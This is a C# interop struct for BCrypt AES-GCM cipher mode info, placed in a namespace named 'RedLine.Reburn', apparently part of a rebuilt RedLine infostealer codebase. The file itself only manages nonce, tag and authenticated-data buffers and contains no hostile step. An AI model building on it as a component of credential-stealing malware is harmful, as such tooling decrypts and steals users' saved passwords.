using System;
using System.Runtime.InteropServices;

namespace RedLine.Reburn.Models.Enums;

public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
{
	public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;

	public int cbSize;

	public int dwInfoVersion;

	public IntPtr pbNonce;

	public int cbNonce;

	public IntPtr pbAuthData;

	public int cbAuthData;

	public IntPtr pbTag;

	public int cbTag;

	public IntPtr pbMacContext;

	public int cbMacContext;

	public int cbAAD;

	public long cbData;

	public int dwFlags;

	public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag)
	{
		this = default(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
		dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
		cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
		if (iv != null)
		{
			cbNonce = iv.Length;
			pbNonce = Marshal.AllocHGlobal(cbNonce);
			Marshal.Copy(iv, 0, pbNonce, cbNonce);
		}
		if (aad != null)
		{
			cbAuthData = aad.Length;
			pbAuthData = Marshal.AllocHGlobal(cbAuthData);
			Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
		}
		if (tag != null)
		{
			cbTag = tag.Length;
			pbTag = Marshal.AllocHGlobal(cbTag);
			Marshal.Copy(tag, 0, pbTag, cbTag);
			cbMacContext = tag.Length;
			pbMacContext = Marshal.AllocHGlobal(cbMacContext);
		}
	}

	public void Dispose()
	{
		if (pbNonce != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbNonce);
		}
		if (pbTag != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbTag);
		}
		if (pbAuthData != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbAuthData);
		}
		if (pbMacContext != IntPtr.Zero)
		{
			Marshal.FreeHGlobal(pbMacContext);
		}
	}
}
